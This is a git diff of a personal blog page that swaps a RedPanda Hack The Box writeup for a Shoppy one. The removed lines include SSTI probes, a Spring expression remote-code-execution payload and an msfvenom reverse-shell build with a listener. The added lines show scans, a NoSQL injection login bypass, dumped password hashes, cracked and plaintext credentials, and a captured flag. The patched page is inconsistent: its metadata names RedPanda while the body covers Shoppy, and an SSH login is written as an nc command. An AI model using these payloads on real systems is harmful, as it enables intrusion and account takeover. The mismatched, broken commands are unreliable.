@@ -1,35 +1,35 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='author = [&amp;lsquo;Abdallah Adham&amp;rsquo;] title = &amp;ldquo;Shoppy HTB Writeup&amp;rdquo; date = 2022-11-8 description = &amp;ldquo;This is a writeup of the Shoppy machine in Hack The Box platform.&amp;rdquo; draft = false slug = &amp;quot;&amp;quot;
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='author = [&amp;lsquo;Abdallah Adham&amp;rsquo;] title = &amp;ldquo;RedPanda HTB Writeup&amp;rdquo; date = 2022-11-16 description = &amp;ldquo;This is a writeup of the RedPanda machine in Hack The Box platform.&amp;rdquo; draft = false slug = &amp;quot;&amp;quot;
 tags = [ &amp;lsquo;HackTheBox&amp;rsquo;, &amp;lsquo;PenTesting&amp;rsquo;,
 &amp;lsquo;Web&amp;rsquo;, &amp;lsquo;Exploit&amp;rsquo;, &amp;lsquo;Vulnerability&amp;rsquo;,]
 categories = [ &amp;lsquo;Pen-Testing&amp;rsquo;,
 &amp;lsquo;Web-Security&amp;rsquo;, ]
-image = &amp;ldquo;post/Shoppy_HTB/shoppy_htb.png&amp;rdquo; &#43;&#43;&#43;
-Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ─$ nmap 10.'><title></title>
+image = &amp;ldquo;post/RedPanda_HTB/redpanda_htb.jpg&amp;rdquo; &#43;&#43;&#43;
+Scanning Nmap 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -A -T4 -p- -oN nmap.'><title></title>
 
 <link rel='canonical' href='https://AbdallahAdham.com/p/'>
 
 <link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content=''>
-<meta property='og:description' content='author = [&amp;lsquo;Abdallah Adham&amp;rsquo;] title = &amp;ldquo;Shoppy HTB Writeup&amp;rdquo; date = 2022-11-8 description = &amp;ldquo;This is a writeup of the Shoppy machine in Hack The Box platform.&amp;rdquo; draft = false slug = &amp;quot;&amp;quot;
+<meta property='og:description' content='author = [&amp;lsquo;Abdallah Adham&amp;rsquo;] title = &amp;ldquo;RedPanda HTB Writeup&amp;rdquo; date = 2022-11-16 description = &amp;ldquo;This is a writeup of the RedPanda machine in Hack The Box platform.&amp;rdquo; draft = false slug = &amp;quot;&amp;quot;
 tags = [ &amp;lsquo;HackTheBox&amp;rsquo;, &amp;lsquo;PenTesting&amp;rsquo;,
 &amp;lsquo;Web&amp;rsquo;, &amp;lsquo;Exploit&amp;rsquo;, &amp;lsquo;Vulnerability&amp;rsquo;,]
 categories = [ &amp;lsquo;Pen-Testing&amp;rsquo;,
 &amp;lsquo;Web-Security&amp;rsquo;, ]
-image = &amp;ldquo;post/Shoppy_HTB/shoppy_htb.png&amp;rdquo; &#43;&#43;&#43;
-Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ─$ nmap 10.'>
+image = &amp;ldquo;post/RedPanda_HTB/redpanda_htb.jpg&amp;rdquo; &#43;&#43;&#43;
+Scanning Nmap 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -A -T4 -p- -oN nmap.'>
 <meta property='og:url' content='https://AbdallahAdham.com/p/'>
 <meta property='og:site_name' content='Abdallah Adham'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' />
 <meta name="twitter:title" content="">
-<meta name="twitter:description" content="author = [&amp;lsquo;Abdallah Adham&amp;rsquo;] title = &amp;ldquo;Shoppy HTB Writeup&amp;rdquo; date = 2022-11-8 description = &amp;ldquo;This is a writeup of the Shoppy machine in Hack The Box platform.&amp;rdquo; draft = false slug = &amp;quot;&amp;quot;
+<meta name="twitter:description" content="author = [&amp;lsquo;Abdallah Adham&amp;rsquo;] title = &amp;ldquo;RedPanda HTB Writeup&amp;rdquo; date = 2022-11-16 description = &amp;ldquo;This is a writeup of the RedPanda machine in Hack The Box platform.&amp;rdquo; draft = false slug = &amp;quot;&amp;quot;
 tags = [ &amp;lsquo;HackTheBox&amp;rsquo;, &amp;lsquo;PenTesting&amp;rsquo;,
 &amp;lsquo;Web&amp;rsquo;, &amp;lsquo;Exploit&amp;rsquo;, &amp;lsquo;Vulnerability&amp;rsquo;,]
 categories = [ &amp;lsquo;Pen-Testing&amp;rsquo;,
 &amp;lsquo;Web-Security&amp;rsquo;, ]
-image = &amp;ldquo;post/Shoppy_HTB/shoppy_htb.png&amp;rdquo; &#43;&#43;&#43;
-Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ─$ nmap 10.">
+image = &amp;ldquo;post/RedPanda_HTB/redpanda_htb.jpg&amp;rdquo; &#43;&#43;&#43;
+Scanning Nmap 1 2 3 4 5 6 7 8 9 10 11 12 $ nmap -A -T4 -p- -oN nmap.">
     </head>
     <body class="
     article-page
@@ -383,7 +383,7 @@ Scanning 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ─$ nma
     
     <p>author = [&lsquo;Abdallah Adham&rsquo;]
 title = &ldquo;Shoppy HTB Writeup&rdquo;
-date = 2022-11-16
+date = 2022-11-8
 description = &ldquo;This is a writeup of the Shoppy machine in Hack The Box platform.&rdquo;
 draft = false
 slug = &quot;&quot;</p>
@@ -397,11 +397,10 @@ slug = &quot;&quot;</p>
 &lsquo;Pen-Testing&rsquo;,<br>
 &lsquo;Web-Security&rsquo;,
 ]</p>
-<p>image = &ldquo;post/RedPanda_HTB/redpanda_htb.jpg&rdquo;
+<p>image = &ldquo;post/Shoppy_HTB/shoppy_htb.png&rdquo;
 +++</p>
 <hr>
 <h2 id="scanning">Scanning</h2>
-<h3 id="nmap">Nmap</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -416,24 +415,48 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nmap -A -T4 -p- -oN nmap.txt 10.10.11.170
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.170
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.17s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE    VERSION
-</span></span><span class="line"><span class="cl">22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ nmap 10.10.11.180 -A -oN nmap.txt 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-11-07 08:19 EST
+</span></span><span class="line"><span class="cl">Stats: 0:00:05 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:07 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">0</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Ping Scan
+</span></span><span class="line"><span class="cl">Parallel DNS resolution of <span class="m">1</span> host. Timing: About 0.00% <span class="k">done</span>
+</span></span><span class="line"><span class="cl">Stats: 0:00:50 elapsed<span class="p">;</span> <span class="m">0</span> hosts completed <span class="o">(</span><span class="m">1</span> up<span class="o">)</span>, <span class="m">1</span> undergoing Script Scan
+</span></span><span class="line"><span class="cl">NSE Timing: About 99.29% <span class="k">done</span><span class="p">;</span> ETC: 08:20 <span class="o">(</span>0:00:00 remaining<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.180
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.21s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 48add5b83a9fbcbef7e8201ef6bfdeae <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> b7896c0b20ed49b2c1867c2992741c1f <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 18cd9d08a621a8b8b6f79f8d405154fb <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">8080/tcp open  http-proxy
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Red Panda Search <span class="p">|</span> Made with Spring Boot 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 9e5e8351d99f89ea471a12eb81f922c0 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5857eeeb0650037c8463d7a3415b1ad5 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3e9d0a4290443860b3b62ce9bd9a6754 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.23.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.23.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://shoppy.htb
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 53.82 seconds
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="enumeration">Enumeration</h2>
-<h3 id="directory-enumeration">Directory Enumeration</h3>
+<h3 id="subdomain-enumeration">Subdomain Enumeration</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -461,11 +484,9 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">23
 </span><span class="lnt">24
 </span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://redpanda.htb:8080/FUZZ
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">─$ ffuf -w Discovery/DNS/bitquark-subdomains-top100000.txt -H <span class="s2">&#34;Host: FUZZ.shoppy.htb&#34;</span> -u http://shoppy.htb -t <span class="m">10</span> -mc <span class="m">200</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
 </span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
@@ -478,157 +499,62 @@ slug = &quot;&quot;</p>
 </span></span><span class="line"><span class="cl">________________________________________________
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"> :: Method           : GET
-</span></span><span class="line"><span class="cl"> :: URL              : http://redpanda.htb:8080/FUZZ
-</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl"> :: URL              : http://shoppy.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: Discovery/DNS/bitquark-subdomains-top100000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.shoppy.htb
 </span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
 </span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
 </span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
-</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
-</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
 </span></span><span class="line"><span class="cl">________________________________________________
-</span></span><span class="line"><span class="cl">search                  <span class="o">[</span>Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 91ms<span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 140ms]</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># directory-list-2.3-medium.txt [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 210ms]</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Copyright 2007 James Fisher [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 210ms]</span>
-</span></span><span class="line"><span class="cl">stats                   <span class="o">[</span>Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 81ms<span class="o">]</span>
-</span></span><span class="line"><span class="cl">error                   <span class="o">[</span>Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 91ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mattermost              <span class="o">[</span>Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 123ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>100000/100000<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">64</span> req/sec :: Duration: <span class="o">[</span>0:22:27<span class="o">]</span> :: Errors: <span class="m">0</span> ::
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>I have found 2 directories which are <em>stats</em> and <em>error</em> but they have nothing we have do about them.</p>
-<p>but in stats we see that there are images for two authors that may help us.</p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/1.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="stats"
-	
-	
-></p>
-<p>By looking at the author <strong>&ldquo;woodenk&rdquo;</strong>, There are some images and every time you view one of them, It increases the number of views by 1 and so on.</p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/2.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="images"
-	
-	
-></p>
-<p>But, Nothing else is important!</p>
-<p>Lets go back to the home page and search on one of those images!</p>
-<h3 id="web-enumeration">Web Enumeration</h3>
-<p>Let&rsquo;s see what is the first thing we see when we open the website?</p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/3.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="home_page"
-	
-	
-></p>
-<p>Now, Let&rsquo;s search on <strong>&ldquo;greg&rdquo;</strong> and see what are the results?</p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/4.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="search"
-	
-	
-></p>
-<p>Okay, This is a little hint i think so!</p>
-<p>After a lot of injections, such as <strong>XSS, LFI, SQLi and SSRF</strong> nothing worked .. But one thing which is <strong>SSTI</strong>.</p>
+</div><h3 id="directory-enumeration">Directory Enumeration</h3>
+<p>$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u <a class="link" href="http://shoppy.htb/FUZZ"  target="_blank" rel="noopener"
+    >http://shoppy.htb/FUZZ</a></p>
+<p>images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 157ms]
+login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 124ms]
+admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 85ms]
+assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 90ms]
+css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 83ms]
+Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 88ms]
+js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 86ms]
+fonts                   [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 439ms]
+Admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 96ms]
+exports                 [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 160ms]
+[Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 87ms]
+LogIn                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 143ms]
+LOGIN                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 118ms]
+:: Progress: [220560/220560] :: Job [1/1] :: 443 req/sec :: Duration: [0:09:27] :: Errors: 0 ::</p>
 <h2 id="exploitation">Exploitation</h2>
-<h3 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h3>
-<h4 id="detect">Detect</h4>
-<p>I have tried a lot of payloads to detect if the server is vulnerable or not.</p>
+<h3 id="nosql-injection">NoSQL Injection</h3>
 <div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username= admin&#39;||&#39;1==1
+</span></span><span class="line"><span class="cl">password= anything
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">{{7*7}}
-</span></span><span class="line"><span class="cl">${7*7}
-</span></span><span class="line"><span class="cl">&lt;%= 7*7 %&gt;
-</span></span><span class="line"><span class="cl">${{7*7}}
-</span></span><span class="line"><span class="cl">#{7*7}
-</span></span><span class="line"><span class="cl">*{7*7}
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">[{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;62db0e93d6d6a999a66ee67a&#34;</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;23c6877d9e2b564ef8b32c3a23de27b2&#34;</span><span class="p">},</span>
+</span></span><span class="line"><span class="cl"> <span class="p">{</span><span class="nt">&#34;_id&#34;</span><span class="p">:</span><span class="s2">&#34;62db0e93d6d6a999a66ee67b&#34;</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;josh&#34;</span><span class="p">,</span><span class="nt">&#34;password&#34;</span><span class="p">:</span><span class="s2">&#34;6ebcea65320589ca4f2f1ce039975995&#34;</span><span class="p">}]</span>
+</span></span><span class="line"><span class="cl"> 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>The only two payloads that worked with me are: <code>#{7*7} and *{7*7}</code>.</p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/5.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="ssti1"
-	
-	
-></p>
-<p><img src="/post/RedPanda_HTB/imgs/RedPanda/6.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="ssti2"
-	
-	
-></p>
-<h4 id="identify">Identify</h4>
-<p>After a lot of searching i have fount that the template engine is called <strong>Spring Framework (Java)</strong></p>
-<h4 id="exploit">Exploit</h4>
-<p>I have found that article from <a class="link" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection"  target="_blank" rel="noopener"
-    >HackTricks</a>, It talks about everything of <strong>SSTI</strong> from detection to exploitation .. Check it out!</p>
-<p>From it, I have found a payload which makes me get an <strong>RCE</strong>!</p>
-<p>Let&rsquo;s start by getting the <strong>id</strong> command:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">*{</span><span class="n">T</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOUtils</span><span class="o">).</span><span class="na">toString</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="err">&#39;</span><span class="n">id</span><span class="err">&#39;</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">())}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="/post/RedPanda_HTB/imgs/RedPanda/7.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="id"
-	
-	
-></p>
-<p>Now, I have initalize a <strong>listener</strong> and get a <strong>Reverse Shell</strong>!</p>
-<ol>
-<li>Initialize a <strong>Listener</strong>:</li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nlvp <span class="m">4444</span>
-</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ol start="2">
-<li>Spawn a Reverse shell payload using <strong>MsVenom</strong>:</li>
-</ol>
+</div><h3 id="hash-decryption">Hash Decryption</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -640,112 +566,69 @@ slug = &quot;&quot;</p>
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.X.X <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f elf -o reverse.elf
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
-</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
-</span></span><span class="line"><span class="cl">Payload size: <span class="m">74</span> bytes
-</span></span><span class="line"><span class="cl">Final size of elf file: <span class="m">194</span> bytes
-</span></span><span class="line"><span class="cl">Saved as: reverse.elf
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Josh Account:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Hash: 6ebcea65320589ca4f2f1ce039975995
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">type: md5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">result: remembermethisway
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ol start="3">
-<li>Initialize a Python server:</li>
-</ol>
+</div><h3 id="ssh-reverse-shell">SSH Reverse shell</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Jaeger account:
+</span></span><span class="line"><span class="cl">username: jaeger
+</span></span><span class="line"><span class="cl">password: Sh0ppyBest@pp!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">─$ nc jaeger@shoppy.htb
+</span></span><span class="line"><span class="cl">jaeger@shoppy.htb password: Sh0ppyBest@pp!
+</span></span><span class="line"><span class="cl">Linux shoppy 5.10.0-18-amd64 <span class="c1">#1 SMP Debian 5.10.140-1 (2022-09-02) x86_64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
+</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span class="line"><span class="cl">permitted by applicable law.
+</span></span><span class="line"><span class="cl">Last login: Tue Nov  <span class="m">8</span> 05:53:00 <span class="m">2022</span> from 10.10.14.38
+</span></span><span class="line"><span class="cl">jaeger@shoppy:~$ ls
+</span></span><span class="line"><span class="cl">Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="usertxt">User.txt</h4>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 -m http.server <span class="m">9000</span>
-</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">9000</span> <span class="o">(</span>http://0.0.0.0:9000/<span class="o">)</span> ...
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">jaeger@shoppy:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">b43c5028ab833b5XXXXXXXXXXXXXX
 </span></span></code></pre></td></tr></table>
 </div>
-</div><ol start="4">
-<li>
-<p>Upload the Reverse shell payload at the victim&rsquo;s machine:
-<img src="/post/RedPanda_HTB/imgs/RedPanda/8.JPG"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rce1"
-	
-	
-></p>
-</li>
-<li>
-<p>Make sure the payload is stored there.
-<img src="/post/RedPanda_HTB/imgs/RedPanda/9.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rce2"
-	
-	
-></p>
-</li>
-</ol>
-<p>So, It is uploaded successfully!</p>
-<ol start="6">
-<li>
-<p>Give the payload the permissions to be executed:
-<img src="/post/RedPanda_HTB/imgs/RedPanda/10.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rce3"
-	
-	
-></p>
-</li>
-<li>
-<p>Make sure it has the execution permissions:
-<img src="/post/RedPanda_HTB/imgs/RedPanda/11.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rce4"
-	
-	
-></p>
-</li>
-<li>
-<p>Run the payload:
-<img src="/post/RedPanda_HTB/imgs/RedPanda/12.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rce5"
-	
-	
-></p>
-</li>
-<li>
-<p>Lastly, Recieve the Reverse Shell:
-<img src="/post/RedPanda_HTB/imgs/RedPanda/13.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="rce6"
-	
-	
-></p>
-</li>
-</ol>
-<p>Then, We spawn <strong>TTY</strong> and make our Revshell as <strong>interactive</strong> as possible.</p>
